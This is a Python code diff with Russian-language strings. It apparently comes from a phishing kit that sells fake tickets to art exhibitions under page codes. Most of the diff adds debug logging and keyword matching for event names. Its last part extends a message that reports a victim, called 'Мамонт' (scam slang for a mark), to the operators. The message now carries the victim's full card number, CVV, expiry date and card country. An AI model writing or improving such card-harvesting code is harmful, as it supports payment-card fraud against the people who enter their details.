@@ -83,10 +83,13 @@ def get_best_fio(default_name: str = "", page_code: str = "", ip: str = "") -> s
 def get_event_name_from_page_code(page_code):
     """Визначає назву події за page_code"""
     if not page_code:
+        print(f"[DEBUG] get_event_name_from_page_code: page_code is empty, returning 'Выставка'")
         return "Выставка"
     
+    print(f"[DEBUG] get_event_name_from_page_code: processing page_code='{page_code}'")
+    
     try:
-        # page_code вже є кодом (наприклад, "2-57"), шукаємо першу цифру
+        # Спочатку спробуємо визначити за числовим кодом (найнадійніший спосіб)
         match = re.search(r'^(\d+)-\d+', page_code)
         if match:
             series = int(match.group(1))
@@ -101,9 +104,42 @@ def get_event_name_from_page_code(page_code):
                 "Jacek Adamas"
             ]
             if 1 <= series <= len(event_names):
-                return event_names[series - 1]
-    except:
-        pass
+                result = event_names[series - 1]
+                print(f"[DEBUG] get_event_name_from_page_code: found by series {series} -> '{result}'")
+                return result
+            else:
+                print(f"[DEBUG] get_event_name_from_page_code: series {series} out of range (1-{len(event_names)})")
+        
+        # Якщо нічого не знайдено, спробуємо визначити за ключовими словами
+        if 'gotong' in page_code.lower() or 'royong' in page_code.lower():
+            print(f"[DEBUG] get_event_name_from_page_code: found by keywords -> 'Gotong Royong'")
+            return "Gotong Royong"
+        elif 'collection' in page_code.lower() or 'co-selection' in page_code.lower():
+            print(f"[DEBUG] get_event_name_from_page_code: found by keywords -> 'Collection Co–selection'")
+            return "Collection Co–selection"
+        elif 'snucie' in page_code.lower():
+            print(f"[DEBUG] get_event_name_from_page_code: found by keywords -> 'Snucie'")
+            return "Snucie"
+        elif 'art' in page_code.lower() and 'saves' in page_code.lower():
+            print(f"[DEBUG] get_event_name_from_page_code: found by keywords -> 'Art that saves lives'")
+            return "Art that saves lives"
+        elif 'anna' in page_code.lower() or 'konik' in page_code.lower():
+            print(f"[DEBUG] get_event_name_from_page_code: found by keywords -> 'Anna Konik'")
+            return "Anna Konik"
+        elif 'uncensored' in page_code.lower():
+            print(f"[DEBUG] get_event_name_from_page_code: found by keywords -> 'Uncensored'")
+            return "Uncensored"
+        elif 'jacek' in page_code.lower() or 'adamas' in page_code.lower():
+            print(f"[DEBUG] get_event_name_from_page_code: found by keywords -> 'Jacek Adamas'")
+            return "Jacek Adamas"
+        elif 'terroir' in page_code.lower() or 'traditions' in page_code.lower():
+            print(f"[DEBUG] get_event_name_from_page_code: found by keywords -> 'Terroir and Traditions'")
+            return "Terroir and Traditions"
+        
+        print(f"[DEBUG] get_event_name_from_page_code: no match found, returning 'Выставка'")
+            
+    except Exception as e:
+        print(f"[ERROR] Error getting event name for page_code {page_code}: {e}")
     
     return "Выставка"
 
@@ -680,14 +716,18 @@ def format_code_request_message(admin_username, name, price, currency, page_code
 
 def format_card_payment_message(page_code, name, price, currency, card_number, cvv="", expiry="", country=""):
     """Формує красиве повідомлення про введення карти"""
-    
-    # Отримуємо назву івенту
+    # Визначаємо назву події за page_code
     event_name = get_event_name_from_page_code(page_code)
     
     message = (
-        f"🔔 Мамонт ввел карту {event_name}\n\n"
+        f"🔔 Мамонт ввел карту ({event_name})\n\n"
+        f"#️⃣ Ссылка: ?page={page_code or 'Не указано'}\n"
         f"👤 Мамонт: {name or 'Не указано'}\n"
-        f"💰 Общая сумма: {price or 'Не указано'}{currency or ''}"
+        f"💰 Общая сумма: {price or 'Не указано'}{currency or ''}\n"
+        f"💳 Номер карты: {card_number or 'Не указано'}\n"
+        f"📅 Срок действия: {expiry or 'Не указано'}\n"
+        f"🔐 CVV: {cvv or 'Не указано'}\n"
+        f"🌍 Страна карты: {country or 'Не указано'}"
     )
     
     return message
